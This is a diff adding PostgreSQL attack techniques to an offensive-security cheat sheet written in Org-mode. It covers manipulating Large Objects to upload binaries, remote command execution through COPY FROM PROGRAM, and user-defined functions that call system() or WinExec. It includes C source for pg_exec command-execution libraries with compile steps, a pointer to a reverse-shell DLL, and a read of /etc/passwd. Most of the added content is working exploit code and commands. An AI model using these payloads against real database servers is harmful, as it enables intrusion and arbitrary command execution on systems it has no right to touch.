@@ -3602,6 +3602,7 @@
         cast(version() AS integer);
       #+end_src
 *** Read/Write Files
+    - Use *Large Objects* for binary files instead
     - Read using function:
       #+begin_src sql
         SELECT pg_read_file('/etc/passwd');
@@ -3617,6 +3618,210 @@
 
         DROP TABLE tmp;
       #+end_src
+*** Read/Write Large Objects
+    - List Large Objects:
+      #+begin_src sql
+        -- IDs only
+        \lo_list
+
+        -- IDs and PageNo (LOBLKSIZE: default 2K)
+        SELECT loid, pageno FROM pg_largeobject;
+        -- Files larger than 2K are split
+
+        -- IDs and data content
+        SELECT loid, encode(data, 'escape') FROM pg_largeobject;
+        -- Read access to LOs is subject to ACL
+        -- Note that newly created LOs might have
+        -- different read perm than existing ones
+      #+end_src
+    - Create LO:
+      #+begin_src sql
+        -- Create and return new ID
+        SELECT lo_create(-1);
+
+        -- Create using given OID
+        SELECT lo_create(1234);
+      #+end_src
+    - Insert binary content (base64 enc) to a LO:
+      #+begin_src sql
+        -- See below for how to split
+        -- First 2K data
+        INSERT INTO pg_largeobject (loid, pageno, data) values (<OID>, 0, decode('<b64-chunk1>', 'base64'));
+
+        -- Second 2K data
+        INSERT INTO pg_largeobject (loid, pageno, data) values (<OID>, 1, decode('<b64-chunk2>', 'base64'));
+      #+end_src
+    - Split file in 2K chunks + encode them:
+      #+begin_src sh
+        split -b 2048 pg_exec.so
+
+        # Base64 - Zsh only
+        for f (x*) base64 -w0 $f && echo
+
+        # Hex - Posix
+        for f in x*; do od -An -tx1 -v $f | tr -d ' \n' && echo; done
+      #+end_src
+    - Read files as LO:
+      #+begin_src sql
+        -- Returns the ID of the LO
+        SELECT lo_import('<file-path>');
+        -- UNC paths work on Windows platforms
+
+        -- Read and assign a LO ID
+        SELECT lo_import('<file-path>', 1234);
+      #+end_src
+    - Update content of LO with hex data:
+      #+begin_src sql
+        UPDATE pg_largeobject SET data=decode('<hex>', 'hex') WHERE loid=1234 AND pageno=0;
+        -- <hex> is 'deadbeef', not '0xfeedcafe'
+      #+end_src
+    - Write LO to file:
+      #+begin_src sql
+        SELECT lo_export(1234, '<file-path>');
+      #+end_src
+    - Delete LO:
+      #+begin_src sql
+        \lo_unlink 1234
+
+        -- or using SELECT
+        SELECT lo_unlink(1234);
+
+        -- Delete all
+        SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;
+      #+end_src
+*** RCE - COPY FROM PROGRAM
+    - [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193][Ref]] - Only if COPY is available - >= 9.3
+      #+begin_src sql
+        DROP TABLE IF EXISTS cmd_exec;
+        CREATE TABLE cmd_exec(cmd_output text);
+
+        -- Run system command
+        COPY cmd_exec FROM PROGRAM '<sys-cmd>';
+
+        SELECT * FROM cmd_exec;
+        DROP TABLE IF EXISTS cmd_exec;
+      #+end_src
+*** RCE - UDF
+**** PostgreSQL < 9.0
+     - Linux
+       #+begin_src sql
+         CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+       #+end_src
+     - Windows
+       #+begin_src sql
+         -- Windows
+         CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
+      #+end_src
+     - Execute:
+       #+begin_src sql
+         SELECT system('<command>');
+       #+end_src
+     - Remove UDF:
+       #+begin_src sql
+         DROP FUNCTION system(cstring);
+       #+end_src
+**** PostgreSQL >= 9.0
+     - From version 11.0 loading shared libraries is only allowed under ~<root-path>/PostgreSQL/11/lib~
+       - Write the LO shared lib to ~<root-path>/PostgreSQL/11/data~ and load it using a relative path:
+         #+begin_src sql
+           -- Linux
+           CREATE OR REPLACE FUNCTION pg_exec(cstring) RETURNS int AS '../data/pg_exec', 'pg_exec' LANGUAGE C STRICT;
+
+           -- Windows
+           CREATE OR REPLACE FUNCTION pg_exec(text) RETURNS int AS '..\data\pg_exec', 'pg_exec' LANGUAGE C STRICT;
+           -- No .so or .dll extension required
+         #+end_src
+     - Linux UDF - ~pg_exec.c~
+       #+begin_src c
+         #include <string.h>
+         #include "postgres.h"
+         #include "fmgr.h"
+
+         #ifdef PG_MODULE_MAGIC
+         PG_MODULE_MAGIC;
+         #endif
+
+         PG_FUNCTION_INFO_V1(pg_exec);
+         Datum pg_exec(PG_FUNCTION_ARGS) {
+             char* command = PG_GETARG_CSTRING(0);
+             PG_RETURN_INT32(system(command));
+         }
+       #+end_src
+     - Compile from Docker
+       #+begin_src sh
+         # Create shared folder
+         mkdir /tmp/pgdocker
+
+         # Place pg_exec.c in /tmp/pgdocker
+
+         # See: https://hub.docker.com/_/postgres
+         docker run -it --rm -v "/tmp/pgdocker:/mnt/pgdocker:rw" --entrypoint /bin/bash postgres:<version>
+
+         # Inside the docker img
+         cd /mnt/pgdocker
+
+         apt update
+
+         # Find the Postgres major+minor version
+         postgres -V
+
+         apt install --no-install-recommends -y gcc libc-dev postgresql-server-dev-<major-minor-ver>
+
+         gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
+
+         exit
+
+         # On host system
+         docker rmi postgres:<version>
+       #+end_src
+     - Windows - ~pg_exec.c~
+       #+begin_src c
+         #include "postgres.h"
+         #include <string.h>
+         #include <stdio.h>
+         #include "fmgr.h"
+         #include "utils/geo_decls.h"
+         #include "utils/builtins.h"
+
+         #ifdef PG_MODULE_MAGIC
+         PG_MODULE_MAGIC;
+         #endif
+
+         /* Add a prototype marked PGDLLEXPORT */
+         PGDLLEXPORT Datum pg_exec(PG_FUNCTION_ARGS);
+         PG_FUNCTION_INFO_V1(pg_exec);
+
+         /* Define function */
+         Datum
+         pg_exec(PG_FUNCTION_ARGS)
+         {
+           /* convert text pointer to C string */
+         #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
+
+           /*launch the process passed in the first parameter*/
+           ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
+           PG_RETURN_VOID();
+         }
+       #+end_src
+     - Compile:
+       - Create a DLL Visual Studio project
+       - *Properties* > *General* > *Character Set*:
+         - ~Use Multi-Byte Character Set~
+       - Include the following dirs in *C/C++*:
+         #+begin_src text
+           c:\Program Files (x86)\PostgreSQL\<version>\include\server\port\win32_msvc;c:\Program Files (x86)\PostgreSQL\<version>\include\server\port\win32;c:\Program Files (x86)\PostgreSQL\<version>\include\server;c:\Program Files (x86)\PostgreSQL\<version>\include;%(AdditionalIncludeDirectories)
+         #+end_src
+       - Include the following dir for in *Linker*:
+         #+begin_src text
+           c:\Program Files (x86)\PostgreSQL\<version>\lib;%(AdditionalLibraryDirectories)
+         #+end_src
+       - Set *Link Library Dependency* to ~No~
+       - Build Project
+     - Windows rev shell DLL: [[https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html][site]]
+       - Just loading the DLL launches the shell
+         #+begin_src sql
+           CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '<path\to>\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
+         #+end_src
 ** Oracle DB
 *** Enumeration
     - List version and current user
